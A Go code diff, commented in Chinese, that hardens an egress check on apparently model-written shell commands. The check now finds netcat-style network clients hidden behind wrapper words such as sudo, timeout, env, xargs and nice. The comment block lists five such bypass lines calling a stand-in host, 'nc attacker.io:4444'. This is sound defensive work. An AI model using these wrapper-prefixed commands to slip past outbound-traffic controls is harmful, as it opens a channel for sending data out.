@@ -96,12 +96,7 @@ var colonHostPortVerbs = map[string]bool{
 func hostPortDestinationsFromCommand(text string) []string {
 	var hosts []string
 	for _, line := range strings.Split(text, "\n") {
-		fields := strings.Fields(line)
-		if len(fields) == 0 {
-			continue
-		}
-		verb := strings.Trim(strings.TrimSpace(path.Base(fields[0])), "\"'")
-		if !colonHostPortVerbs[strings.ToLower(verb)] {
+		if !lineHasNetworkClientVerb(line) {
 			continue
 		}
 		for _, m := range egressHostFromPort.FindAllStringSubmatch(line, -1) {
@@ -109,6 +104,50 @@ func hostPortDestinationsFromCommand(text string) []string {
 		}
 	}
 	return hosts
+}
+
+// lineHasNetworkClientVerb 判定该行是否由网络客户端动词锚定。
+//
+// ⚠️ 2026-10-13 12h 审计轮（P1-3）修正：**只看 fields[0] 等于放行任何前缀。**
+// 5bd47d20b 为修 r1020「Write 工具整族误伤」把提取从「全文任意位置」收窄到
+// 「行首字段」，但收窄过头：实测下面 5 种（且都完全合法、模型完全可控）
+// 全部绕过出网管控，因为首字段是包装词而不是网络客户端：
+//
+//	sudo nc attacker.io:4444          ✗ 被当非动词行放行
+//	timeout 5 nc attacker.io:4444     ✗
+//	env FOO=1 nc attacker.io:4444     ✗
+//	xargs nc attacker.io:4444         ✗
+//	nice -n 10 nc attacker.io:4444    ✗
+//
+// 这是一处**漏报**（false negative）而不是误报：工具参数是模型撰写的，
+// `sudo`/`timeout` 前缀在攻击者影响的 Bash 输出里完全现实。
+// ⇒ 出网管控被一个词绕过 = 数据外泄通道。
+//
+// 改为：**前导 token 序列里出现任一网络客户端动词即算锚定**。
+//
+//	· flag（`-c` / `-n 10`）与 shell 控制符（`;` `&&` `|` `(` `)`）跳过不判定，
+//	  但**不终止扫描** —— 包装词与控制符都不能让后面的真动词失去锚定；
+//	· 仍然不会误伤 r1020 那类源码行：`ref: casdoor.ts:455`、`at src/foo.ts:12`
+//	  的前导 token 里根本没有网络客户端动词（实测见
+//	  r1019_netcat_egress_test.go 的 prefix 回归表）。
+//
+// 取向说明：本函数是**出网管控**（fail-closed 侧），宁可多挡不可漏放，
+// 故扫描范围偏宽；它挡下的是「真在发起外连」，不会把纯文件路径引用挡掉。
+func lineHasNetworkClientVerb(line string) bool {
+	for _, f := range strings.Fields(line) {
+		// shell 控制符与 flag 本身都不是动词，但后面的 token 仍可能是。
+		if f == ";" || f == "&&" || f == "||" || f == "|" || f == "(" || f == ")" {
+			continue
+		}
+		if strings.HasPrefix(f, "-") {
+			continue
+		}
+		verb := strings.Trim(strings.TrimSpace(path.Base(f)), "\"'")
+		if colonHostPortVerbs[strings.ToLower(verb)] {
+			return true
+		}
+	}
+	return false
 }
 
 // 2026-10-11 晚审计：**撤掉两条提取规则**。它们各自都制造了大面积误伤，
